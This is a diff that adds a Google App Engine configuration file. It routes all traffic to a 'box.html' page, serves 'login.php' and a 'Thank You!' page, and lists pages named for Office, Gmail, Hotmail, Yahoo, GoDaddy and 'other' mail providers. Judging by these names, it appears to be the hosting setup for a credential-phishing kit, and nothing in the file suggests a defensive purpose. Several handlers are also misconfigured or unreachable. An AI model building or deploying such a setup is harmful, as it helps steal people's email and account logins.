@@ -1,0 +1,50 @@
+runtime: php73
+api_version: 1
+threadsafe: true
+
+handlers:
+- url: /assets/img
+  static_dir: assets/img
+
+- url: /images
+  static_dir: images
+
+- url: /Thank You!_files
+  static_dir: Thank You!_files
+
+- url: /.*
+  script: box.html
+  #login: required
+  #auth_fail_action: redirect
+
+- url: /index.php
+  script: box.html
+  #login: required
+  #auth_fail_action: redirect
+
+- url: /login
+  static_dir: login.php
+
+- url: /login.php
+  static_dir: login.php
+
+- url: /Thank You!.html
+  script: Thank You!.html
+
+- url: /001100110011office.html
+  script: 001100110011office.html
+
+- url: /001100110011gmail.html
+  script: 001100110011gmail.html
+
+- url: /001100110011hotmail.html
+  script: 001100110011hotmail.html
+
+- url: /001100110011yahoo.html
+  script: 001100110011yahoo.html
+
+- url: /001100110011godaddy.html
+  script: 001100110011godaddy.html
+
+- url: /001100110011other.html
+  script: 001100110011other.html
